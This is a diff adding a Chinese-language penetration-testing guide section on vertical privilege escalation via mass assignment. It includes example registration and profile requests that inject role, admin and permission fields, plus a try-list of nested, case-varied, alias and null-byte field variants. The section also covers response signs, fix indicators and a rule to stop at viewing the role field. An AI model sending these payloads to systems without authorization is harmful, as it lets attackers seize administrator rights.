@@ -270,6 +270,60 @@ GET /api/report/daily?date=2025-01-01          # 财务日报
 
 如果不能用两个账号证明（如目标是 `/api/admin/wipeAll`），**只截 JS / Burp 看到接口暴露 + curl 不带 cookie 看 401/403 是否拦截**，绝不实际触发。
 
+### 6.4 垂直越权 / roleid 修改（高频 mass-assignment 子类）
+
+与水平越权（IDOR：改 `id=B` 看 B 数据）相对，**垂直越权**指普通用户改字段把自己提权到 admin / 运营 / 客服。最常见的 sink 是后端没过滤掉的 `role` / `roleid` / `permission` / `level` / `is_admin` 字段。
+
+**典型攻击面**:
+- **注册**:`POST /api/register` body 多塞一个 `roleid=99` / `role=admin` / `permissions=["*"]` —— 后端若 mass-assign 整个 body 到 user model,提权完成
+- **个人资料更新**:`PUT /api/user/profile` 加 `role` / `groupId` —— 资料接口未白名单字段
+- **管理员邀请回填**:接受邀请时回传 `inviteRole`,后端信任前端值
+- **OIDC / SSO 回调**:回调 body 含 `groups` 数组,后端直接落库
+
+**探针(标准 mass-assignment 流程)**:
+
+```bash
+# 1. 抓正常注册 / 个人资料更新包,记录字段集合 F0
+POST /api/register {"username":"u","password":"p","email":"u@x"}
+
+# 2. 在 F0 基础上加 admin-意味字段(多个一起试,后端可能只过滤一两个)
+POST /api/register {"username":"u","password":"p","email":"u@x",
+  "role":"admin",          "roleid":99,        "role_id":99,
+  "is_admin":true,         "isAdmin":true,     "admin":true,
+  "permissions":["*"],     "level":99,         "user_type":"admin",
+  "groupId":1,             "tenantId":1,       "departmentId":1,
+  "is_super":1,            "vip_level":99
+}
+
+# 3. 立刻验证:用新账号请求管理员-only 接口
+GET /api/admin/users
+GET /api/admin/stats
+GET /api/system/config
+```
+
+**JSON 嵌套 / 大小写 / 别名 try-list**:
+```text
+"user":{"role":"admin"}        # 嵌套
+"User":{"Role":"admin"}        # PascalCase
+"profile":{"isAdmin":true}     # camelCase nested
+"meta":{"role_id":99}          # 元数据字段
+"extra":{"admin":1}            # 扩展字段
+"_role":"admin"                # 下划线前缀(部分框架默认 strip)
+"role[]=admin"                 # 表单数组
+"role%00":"admin"              # 空字节
+```
+
+**响应特征**:
+- 返回的 JSON 里包含 `role: "admin"`(后端把字段回显)→ 命中
+- 注册后立刻 `/api/me` 看角色字段 → 命中
+- 注册响应里 token / session 解码后含 `admin` claim → 命中
+
+**修复识别**:
+- 后端有显式 DTO / serializer 白名单 → 字段被丢弃,响应不变
+- 后端用 ORM 全字段 hydrate(Laravel `$fillable` 设为 `*`、Django ModelForm 不限 `fields`)→ 大概率命中
+
+**红线**:确认能提权后**只用 `/api/me` 看 role 字段**,不进入 admin 后台实际操作。截图 + 字段差异即可证明影响。
+
 ---
 
 ## 7. 通用探测协议（适用于所有 6 子类）
